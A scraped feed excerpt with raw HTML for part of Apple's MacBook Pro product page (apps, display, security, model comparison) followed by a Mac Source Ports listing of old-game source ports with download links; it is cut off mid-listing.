							<div id="apps-gallery-gallery-item-3" data-analytics-gallery-item-id="business" data-ac-gallery-item="3" role="tabpanel" aria-labelledby="apps-gallery-tab-3">
								
								<p>Keynote</p>
								<div id="apps-gallery-gallery-caption-3" data-captions-gallery-item="">
										<p><span>Multitask like a boss.</span> Create documents and presentations and collaborate across apps and video conferences — and do it all at&nbsp;once. </p>
										<p>Microsoft&nbsp;365&nbsp;Copilot, Slack, Zoom, Keynote, Omni&nbsp;Productivity&nbsp;Suite, and&nbsp;more.</p>
									</div>
							</div>
							<div id="apps-gallery-gallery-item-4" data-analytics-gallery-item-id="graphic design" data-ac-gallery-item="4" role="tabpanel" aria-labelledby="apps-gallery-tab-4">
								
								<p>Adobe InDesign</p>
								<div id="apps-gallery-gallery-caption-4" data-captions-gallery-item="">
										<p><span>Find your type.</span> Take on illustrations, font creation, visual editing, interactive design, and motion graphics with absolute&nbsp;ease. </p>
										<p>Adobe&nbsp;InDesign, Sketch, Linearity&nbsp;Curve, Adobe&nbsp;Illustrator, Figma, and&nbsp;more.</p>
									</div>
							</div>
							<div id="apps-gallery-gallery-item-5" data-analytics-gallery-item-id="3d animation and design" data-ac-gallery-item="5" role="tabpanel" aria-labelledby="apps-gallery-tab-5">
								
								<p>Blender</p>
								<div id="apps-gallery-gallery-caption-5" data-captions-gallery-item="">
										<p><span>Bring your imagination to life.</span> Build intricate texturing in 3D artwork, create complex animations, and render high-resolution&nbsp;scenes.</p>
										<p>Blender, Maxon&nbsp;Cinema&nbsp;4D, Maxon&nbsp;Redshift, Autodesk&nbsp;Maya, Adobe&nbsp;Substance&nbsp;Painter, Houdini, and&nbsp;more.</p>
									</div>
							</div>
							<div id="apps-gallery-gallery-item-6" data-analytics-gallery-item-id="music production" data-ac-gallery-item="6" role="tabpanel" aria-labelledby="apps-gallery-tab-6">
								
								<p>Logic&nbsp;Pro</p>
								<div id="apps-gallery-gallery-caption-6" data-captions-gallery-item="">
										<p><span>Produce the whole album.</span> Compose, record, and mix across thousands of tracks with hundreds of plug-ins in real&nbsp;time. </p>
										<p>Logic&nbsp;Pro, Pro&nbsp;Tools, Ableton&nbsp;Live, Cubase, Adobe&nbsp;Audition, FL&nbsp;Studio, MainStage, and&nbsp;more.</p>
									</div>
							</div>
							<div id="apps-gallery-gallery-item-7" data-analytics-gallery-item-id="video editing" data-ac-gallery-item="7" role="tabpanel" aria-labelledby="apps-gallery-tab-7">
								
								<p>DaVinci Resolve Studio</p>
								<div id="apps-gallery-gallery-caption-7" data-captions-gallery-item="">
										<p><span>Craft stories worth telling.</span> Fly through 4K and 8K footage and tackle motion graphics and compositing with superfast render&nbsp;times. </p>
										<p>DaVinci&nbsp;Resolve&nbsp;Studio, Adobe&nbsp;Premiere&nbsp;Pro, Final&nbsp;Cut&nbsp;Pro, Motion, Adobe&nbsp;After&nbsp;Effects, Nuke, Autodesk&nbsp;Flame, and&nbsp;more.</p>
									</div>
							</div>
							<div id="apps-gallery-gallery-item-8" data-analytics-gallery-item-id="gaming" data-ac-gallery-item="8" role="tabpanel" aria-labelledby="apps-gallery-tab-8">
								
								<p>Cyberpunk 2077: Ultimate</p>
								<div id="apps-gallery-gallery-caption-8" data-captions-gallery-item="">
										<p><span>Play favorites.</span> Enjoy immersive gaming thanks to the exceptional graphics capabilities, gorgeous XDR display, and six-speaker sound system with Spatial&nbsp;Audio. Turn on Game&nbsp;Mode for smoother frame&nbsp;rates.</p>
										<p>Assassin’s&nbsp;Creed&nbsp;Shadows, Control&nbsp;Ultimate&nbsp;Edition, Frostpunk&nbsp;2, World&nbsp;of&nbsp;Warcraft, Sid&nbsp;Meier’s&nbsp;Civilization®&nbsp;VII, and&nbsp;more.</p>
									</div>
							</div>
						</div>
		<div data-component-list="StaggeredFadeIn" data-section-name="display" data-analytics-section-engagement="name:display intro" data-will-change="" data-zoom-out="" data-anim-scroll-group="Display" data-theme-changer="dark">
				<div>
								<p>
									<span data-anim-keyframe="{&quot;start&quot;: &quot;t - 90vh&quot;, &quot;end&quot;: &quot;t - 80vh&quot;, &quot;opacity&quot;: [0, 1], &quot;disabledWhen&quot;: &quot;no-enhanced&quot;}">Up to 1,600 nits peak HDR brightness</span>
								</p>
								<p>
									<span data-anim-keyframe="{&quot;start&quot;: &quot;t - 90vh&quot;, &quot;end&quot;: &quot;t - 80vh&quot;, &quot;opacity&quot;: [0, 1], &quot;disabledWhen&quot;: &quot;no-enhanced&quot;}">1,000 nits sustained HDR brightness</span>
								</p>
								<p>
									<span data-anim-keyframe="{&quot;start&quot;: &quot;t - 90vh&quot;, &quot;end&quot;: &quot;t - 80vh&quot;, &quot;opacity&quot;: [0, 1], &quot;disabledWhen&quot;: &quot;no-enhanced&quot;}">1,000,000:1 contrast ratio</span>
								</p>
								<p>
									<span data-anim-keyframe="{&quot;start&quot;: &quot;t - 90vh&quot;, &quot;end&quot;: &quot;t - 80vh&quot;, &quot;opacity&quot;: [0, 1], &quot;disabledWhen&quot;: &quot;no-enhanced&quot;}">Down to 1 nit brightness in dark environments</span>
								</p>
								<p>
									<span data-anim-keyframe="{&quot;start&quot;: &quot;t - 90vh&quot;, &quot;end&quot;: &quot;t - 80vh&quot;, &quot;opacity&quot;: [0, 1], &quot;disabledWhen&quot;: &quot;no-enhanced&quot;}">Up to 1,000 nits SDR brightness outdoors</span>
								</p>
								<p>
									<span data-anim-keyframe="{&quot;start&quot;: &quot;t - 90vh&quot;, &quot;end&quot;: &quot;t - 80vh&quot;, &quot;opacity&quot;: [0, 1], &quot;disabledWhen&quot;: &quot;no-enhanced&quot;}">1,000,000,000 colors</span>
								</p>
								<!-- custom scrim animation -->
								
							</div>
				
				<div>
						<p><span>Go from the sunniest terrace to the darkest studio</span> with more ease than ever. The eye-popping Liquid&nbsp;Retina&nbsp;XDR&nbsp;display offers up to 1,600 nits peak HDR brightness. And it provides up to 1,000 nits of brightness for SDR content in bright light so you can see what’s on your screen more clearly outside. In low-light situations, it dims to 1 nit so you can work comfortably in darker&nbsp;spaces.</p>
						<div>
							<ul>
								<li>Up to 1,600 nits peak HDR brightness</li>
								<li>1,000 nits sustained HDR brightness</li>
								<li>1,000,000:1 contrast ratio</li>
								<li>Down to 1 nit brightness in dark environments</li>
								<li>Up to 1,000 nits SDR brightness outdoors</li>
								<li>1,000,000,000 colors</li>
							</ul>
						</div>
					</div>
			</div>
		<div id="camera-gallery" data-has-captions="" data-initial-index="0" data-analytics-gallery-id="camera gallery" data-auto-play-off="false" data-auto-play-active-item="" data-component-list="StaggeredFadeIn" data-anim-scroll-group="Camera" data-theme-changer="dark" data-analytics-section-engagement="name:camera">
							<div id="camera-gallery-gallery-item-0" data-captions-gallery-item="" data-analytics-gallery-item-id="center stage" data-ac-gallery-item="0" role="tabpanel" aria-labelledby="camera-gallery-tab-0">
									<p>Center&nbsp;Stage keeps you in frame during video calls, even as you move around or when more people join your&nbsp;frame.</p>
								</div>
							<div id="camera-gallery-gallery-item-1" data-captions-gallery-item="" data-analytics-gallery-item-id="desk view" data-ac-gallery-item="1" role="tabpanel" aria-labelledby="camera-gallery-tab-1">
									<p>Desk&nbsp;View lets you share your workspace, adding a whole new dimension to make your video calls more&nbsp;engaging.</p>
								</div>
						</div>
		<div data-anim-scroll-group="Security" data-theme-changer="dark" data-analytics-section-engagement="name:security" data-component-list="StaggeredFadeIn">
				
				<div>
					<picture id="overview-security-security-hero-1" data-lazy="">
						<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
						<img src="https://www.apple.com/v/macbook-pro/at/images/overview/security/security_hero__f06nvgwd8eye_large.jpg" onload="window.__lp?.(event)" alt="While browsing in Safari, a user is prompted to use Touch ID to sign in to a website">
					</picture>
					
				</div>
				<p data-staggered-item=""><span>Security starts with Apple&nbsp;silicon</span> and extends to the macOS architecture. This deep integration of hardware and software along with automatic software updates helps keep MacBook&nbsp;Pro stable and protected for the long term. The security architecture also powers features such as Touch&nbsp;ID, Find&nbsp;My, and advanced defenses that protect against viruses and&nbsp;malware.
					</p>
				<div>
						<div data-staggered-item="">
							<div>
								<picture id="overview-security-security-icon-touchid-1" data-lazy="" data-download-area-keyframe="{&quot;start&quot;: &quot;t - 150vh&quot;, &quot;end&quot;: &quot;b&quot;}">
									<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
									<img src="https://www.apple.com/v/macbook-pro/at/images/overview/security/security_icon_touchid__esgl4qj1ylkm_large.png" onload="window.__lp?.(event)" alt="">
								</picture>
								
							</div>
							<div>
								<h3>Touch&nbsp;ID.</h3>
								<p>Unlock your Mac, sign in to apps, and make secure payments with your fingertip. The Secure&nbsp;Enclave keeps your fingerprint data&nbsp;safe.</p>
							</div>
						</div>
						<div data-staggered-item="">
							<div>
								<picture id="overview-security-security-icon-findmy-1" data-lazy="" data-download-area-keyframe="{&quot;start&quot;: &quot;t - 150vh&quot;, &quot;end&quot;: &quot;b&quot;}">
									<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
									<img src="https://www.apple.com/v/macbook-pro/at/images/overview/security/security_icon_findmy__edciyxehqsa6_large.png" onload="window.__lp?.(event)" alt="">
								</picture>
								
							</div>
							<div>
								<h3>Find&nbsp;My.</h3>
								<p>Locate your misplaced MacBook&nbsp;Pro and remotely lock or erase it if&nbsp;needed.</p>
							</div>
						</div>
						<div data-staggered-item="">
							<div>
								<picture id="overview-security-security-icon-privacy-1" data-lazy="" data-download-area-keyframe="{&quot;start&quot;: &quot;t - 150vh&quot;, &quot;end&quot;: &quot;b&quot;}">
									<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
									<img src="https://www.apple.com/v/macbook-pro/at/images/overview/security/security_icon_privacy__vf4d2pc74v6i_large.png" onload="window.__lp?.(event)" alt="">
								</picture>
								
							</div>
							<div>
								<h3>FileVault.</h3>
								<p>Encrypt and protect your files and data without having to think about&nbsp;it.</p>
							</div>
						</div>
					</div>
			</div>
		
		
		<div data-anim-scroll-group="Upgraders" data-theme-changer="dark" data-deep-link="upgraders-gallery" data-analytics-section-engagement="name:upgrade" data-component-list="StaggeredFadeIn">
				<h2>There’s never been&nbsp;a&nbsp;<span>better time&nbsp;to upgrade.</span></h2>
				<div data-component-list="UpgradersGallery">
						<p><span>Select your current MacBook&nbsp;Pro:</span></p>
					</div>
				
				
				
			</div>
		
		
		<div data-staggered-item="" data-anim-scroll-group="Contrast" data-analytics-section-engagement="name:compare" data-component-list="StaggeredFadeIn">
							<ul role="list" aria-labelledby="demo3ID">
								<li role="listitem" data-staggered-item="">
									<h3>
										<span>
                                			<span>MacBook&nbsp;Air 13”&nbsp;and&nbsp;15”
                                	</span>
										
										<span>M4&nbsp;chip</span>
										</span>
									</h3>
									<a href="https://www.apple.com/macbook-air/" data-analytics-title="learn more - macbook air - image">
										<picture id="overview-contrast-macbook-air-13-15-1" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/contrast/macbook_air_13_15__dae4ovt0uyeu_large.png" onload="window.__lp?.(event)" alt="MacBook Air 13-inch and 15-inch">
										</picture>
										
									</a>
									<div>
										<ul role="list" aria-label="Available colors">
											<li>
												<span>Sky Blue</span>
											</li>
											<li>
												<span>Silver</span>
											</li>
											<li>
												<span>Starlight</span>
											</li>
											<li>
												<span>Midnight</span>
											</li>
											<li>
												+<span>more</span>
											</li>
										</ul>
									</div>
									<p>Strikingly thin and fast so you can work, play, or create&nbsp;anywhere.</p>
									<p data-pricing-hide="macbook-air"><span data-pricing-product="macbook-air" data-product-template="${price.display.from}"></span><span data-toggle="acmi"><span data-pricing-product="macbook-air" data-product-template=" or ${price.display.perMonth} for&nbsp;${price.display.months}&nbsp;mo."></span><span data-footnote="starred-monthly-pricing"><a href="#footnote-1" aria-label="Footnote * symbol" data-modal-close="">*</a></span></span>
									</p>
									
									<div>
										<div>
											<div>
												<picture id="overview-contrast-icon-mx-1" data-lazy="">
													<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
													<img src="https://www.apple.com/v/macbook-pro/at/images/overview/contrast/icon_mx__eh64ycjrkpqq_large.png" onload="window.__lp?.(event)" alt="">
												</picture>
												
											</div>
											<p>Apple M4&nbsp;chip</p>
										</div>
										<div>
											<div>
												<picture id="overview-contrast-icon-apple-intelligence-1" data-lazy="">
													<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
													<img src="https://www.apple.com/v/macbook-pro/at/images/overview/contrast/icon_apple_intelligence__f2cdmwimgiq2_large.png" onload="window.__lp?.(event)" alt="">
												</picture>
												
											</div>
											<p>Apple&nbsp;Intelligence<sup data-footnote="numbered-apple-intelligence"><a href="#footnote-50" aria-label="Footnote 47" data-modal-close="">47</a></sup></p>
										</div>
										<div>
											<figure>
												<p><span>Up to</span><span>18 hours</span><span>battery life<sup data-footnote="numbered-macbook-air-battery"><a href="#footnote-54" aria-label="Footnote 51" data-modal-close="">51</a></sup></span></p>
											</figure>
										</div>
										<div>
											<figure>
												<p><span>4 ports</span><span>2x Thunderbolt 4 (USB-C), <br>headphone jack, MagSafe</span></p>
											</figure>
										</div>
									</div>
								</li>
								<li role="listitem" data-staggered-item="">
									<h3>
										<span>New 14” with M5</span>
										<span>
                                			<span>MacBook&nbsp;Pro 14”&nbsp;and&nbsp;16”
                                	</span>
										
										<span>M5, M4&nbsp;Pro, or M4&nbsp;Max&nbsp;chip</span>
										</span>
									</h3>
									<div>
										<picture id="overview-contrast-macbook-pro-14-16-1" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/contrast/macbook_pro_14_16__f95h411qi7yq_large.png" onload="window.__lp?.(event)" alt="MacBook Pro 14-inch and 16-inch">
										</picture>
										
									</div>
									<div>
										<ul role="list" aria-label="Available colors">
											<li>
												<span>Space Black</span>
											</li>
											<li>
												<span>Silver</span>
											</li>
											<li>
												+<span>more</span>
											</li>
										</ul>
									</div>
									<p>The most advanced Mac laptops for demanding workflows.</p>
									<p data-pricing-hide="macbook-pro"><span data-pricing-product="macbook-pro" data-product-template="${price.display.from}"></span><span data-toggle="acmi"><span data-pricing-product="macbook-pro" data-product-template=" or ${price.display.perMonth} for&nbsp;${price.display.months}&nbsp;mo."></span><span data-footnote="starred-monthly-pricing"><a href="#footnote-1" aria-label="Footnote * symbol" data-modal-close="">*</a></span></span>
									</p>
									<div data-ctas="">
										<p><span>Currently Viewing<span>, MacBook Pro</span>
											</span>
										</p>
										<p><a href="https://www.apple.com/us/shop/goto/buy_mac/macbook_pro" data-analytics-title="shop - macbook pro 14 and 16 inch" aria-label="Shop, MacBook Pro"><span>Shop</span></a>
									</p></div>
									<div>
										<div>
											<div>
												<picture id="overview-contrast-icon-mx-pro-max-1" data-lazy="">
													<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
													<img src="https://www.apple.com/v/macbook-pro/at/images/overview/contrast/icon_mx_pro_max__p50p1g525rmu_large.png" onload="window.__lp?.(event)" alt="">
												</picture>
												
											</div>
											<p>Apple M5, M4&nbsp;Pro, or M4&nbsp;Max&nbsp;chip</p>
										</div>
										<div>
											<div>
												<picture id="overview-contrast-icon-apple-intelligence-2" data-lazy="">
													<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
													<img src="https://www.apple.com/v/macbook-pro/at/images/overview/contrast/icon_apple_intelligence__f2cdmwimgiq2_large.png" onload="window.__lp?.(event)" alt="">
												</picture>
												
											</div>
											<p>Apple&nbsp;Intelligence<sup data-footnote="numbered-apple-intelligence"><a href="#footnote-50" aria-label="Footnote 47" data-modal-close="">47</a></sup></p>
										</div>
										<div>
											<figure>
												<p><span>Up to</span><span>24 hours</span><span>battery life<sup data-footnote="numbered-m4-pro-16-battery"><a href="#footnote-55" aria-label="Footnote 52" data-modal-close="">52</a></sup></span></p>
											</figure>
										</div>
										<div>
											<figure>
												<p><span>Up to</span><span>7 ports</span><span>3x Thunderbolt 4 (USB-C) or <br>3x Thunderbolt 5 (USB-C), <br>HDMI, SDXC, headphone jack, MagSafe</span></p>
											</figure>
										</div>
									</div>
								</li>
							</ul>
						</div>
		
		
		<div data-anim-scroll-group="Index" data-analytics-section-engagement="name:router" data-component-list="StaggeredFadeIn">
				<p id="mac-index" data-component-list="Index" data-family-name="mac" data-anim-keyframe="{&quot;start&quot;:&quot;t - 70vh&quot;,&quot;cssClass&quot;:&quot;animate&quot;}">
					<h2 data-staggered-item="">Mac</h2>
					<nav aria-labelledby="mac-index">
					</nav>
				</p>
			</div>
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Mac Source Ports – Run old games on new Macs (157 pts)]]></title>
            <link>https://www.macsourceports.com/</link>
            <guid>45591865</guid>
            <pubDate>Wed, 15 Oct 2025 13:07:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.macsourceports.com/">https://www.macsourceports.com/</a>, See on <a href="https://news.ycombinator.com/item?id=45591865">Hacker News</a></p>
<div id="readability-page-1" class="page"><div _ngcontent-qyv-c46=""><router-outlet _ngcontent-qyv-c46=""></router-outlet><home _nghost-qyv-c37=""><p _ngcontent-qyv-c37=""><strong _ngcontent-qyv-c37="">Mac Source Ports</strong> features native app builds of source ports of your favorite games for both Apple Silicon and Intel Macs, <span _ngcontent-qyv-c37="" ngbtooltip="Digitally signed executables to run on macOS with Gatekeeper" placement="bottom" ng-reflect-ngb-tooltip="Digitally signed executables t" ng-reflect-placement="bottom">signed</span><!--container--> and <span _ngcontent-qyv-c37="" ngbtooltip="Submitted and notarized by Apple to be free from malware" placement="bottom" ng-reflect-ngb-tooltip="Submitted and notarized by App" ng-reflect-placement="bottom">notarized</span><!--container--> whenever possible.</p><!--bindings={
  "ng-reflect-ng-if": "false"
}--><span _ngcontent-qyv-c37="">Showing 1-10 of 167 games</span><!--bindings={
  "ng-reflect-ng-if": "true"
}--><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Stainless Games<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;June 13, 1997<br _ngcontent-qyv-c32=""><!--bindings={}--></p><div _ngcontent-qyv-c32=""><p>An example of controversy for controversy's sake, <em>Carmageddon</em> basically took what people wanted to do in other racing games - crash into other cars and run over pedestrians - and turned it into the primary gameplay loop. They took the macabre joke about getting points for hitting people in your car and made it a gameplay mechanic. The game was successful both from a critical and commercial perspective, as well as its goal as a controversy magnet.</p><p>The dethrace project is a source port where in lieu of source code they're reverse engineering it, and according to their Twitter account they're approximately 70% of the way there. The game is very playable but may crash in some places, so I'm introducing a new tag: Early Access. This probably could use a better name but I'm using it to convey the notion that the project doesn't consider itself completely finished (though there are reports of people making it through the entire game), but it's still pretty awesome so I figured if nothing else it's worth putting up a quick build.</p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/carmag"
}--><!--bindings={
  "ng-reflect-ng-if": ""
}--><div _ngcontent-qyv-c32=""><p><span _ngcontent-qyv-c32="">Purchasing a game through one of our links helps support the site.&nbsp;&nbsp;<span _ngcontent-qyv-c32="">You can use our <a _ngcontent-qyv-c32="" href="https://macsourceports.com/utility/extractor"><i _ngcontent-qyv-c32="">Extractor</i></a> utility to get the data from the GOG game installer.</span><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/carmag"
}--></span></p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/carmag"
}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/carmageddon_ss1.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <p><span _ngcontent-qyv-c31=""><p>Early Access</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Signed</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Notarized</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Mac Source Ports Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/MacSourcePorts/MSPBuildSystem/releases/download/dethrace_0.9.0/dethrace-0.9.0.dmg">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version v0.9.0</span></p><!--bindings={
  "ng-reflect-ng-if": "v0.9.0"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.15 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.15"
}--></div><p>Build date: October 3, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Pumpkin Studios<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;April 10, 1999<br _ngcontent-qyv-c32=""><span _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Source Code Release Date:</strong>&nbsp;December 6, 2004</span><!--bindings={
  "ng-reflect-ng-if": "December 6, 2004"
}--></p><div _ngcontent-qyv-c32=""><p><em>Warzone 2100</em> is a post-apocalyptic real-time strategy game from 1999 whose source was released in 2004 and whose content was released as freeware in 2008.</p><p>Although my aim is to host signed and notarized game bundles on Mac Source Ports, the Warzone 2100 Project has done incredible work on this port and has logistical reasons for not being notarized yet. While they work through that process, I decided it was worth making an exception to the site's policy so that Apple Silicon gamers looking for a full, free and polished RTS would be able to find it.</p><p>Because the app bundle is not notarized, on first run you may run into issues. The shortest answer is to right-click on the app bundle (wz2100.app) and select Open. The long answer is <a href="https://sixcolors.com/post/2016/02/override-gatekeeper-with-one-click/" target="_new">here</a>.</p></div><!--bindings={
  "ng-reflect-ng-if": ""
}--><!--bindings={}--><!--bindings={}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/warzone2100_ss1.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Full Game</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Ad Hoc Signed </p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/Warzone2100/warzone2100/releases/download/4.6.1/warzone2100_macOS_universal.zip">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 4.6.1</span></p><!--bindings={
  "ng-reflect-ng-if": "4.6.1"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.13 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.13"
}--></div><p>Build date: September 16, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Grey Matter Interactive<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;November 19, 2001<br _ngcontent-qyv-c32=""><span _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Source Code Release Date:</strong>&nbsp;August 12, 2010</span><!--bindings={
  "ng-reflect-ng-if": "August 12, 2010"
}--></p><p _ngcontent-qyv-c32=""><em>Return to Castle Wolfenstein</em> is a fantastic single player game with lots of little touches you might have missed the first time around and that you don't see much anymore. Still abolutely worth firing up just to blast some Nazis. This source port also includes the multiplayer as a separate app, which still works on the servers running to this day.</p><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/return"
}--><!--bindings={
  "ng-reflect-ng-if": "https://humblebundleinc.sjv.io"
}--><div _ngcontent-qyv-c32=""><p><span _ngcontent-qyv-c32="">Purchasing a game through one of our links helps support the site.&nbsp;&nbsp;<span _ngcontent-qyv-c32="">You can use our <a _ngcontent-qyv-c32="" href="https://macsourceports.com/utility/extractor"><i _ngcontent-qyv-c32="">Extractor</i></a> utility to get the data from the GOG game installer.</span><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/return"
}--></span></p></div><!--bindings={
  "ng-reflect-ng-if": "https://af.gog.com/game/return"
}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/rtcw_ss.png"></p></div><p><span _ngcontent-qyv-c32="">Source Port<span _ngcontent-qyv-c32="">s</span><!--bindings={
  "ng-reflect-ng-if": "true"
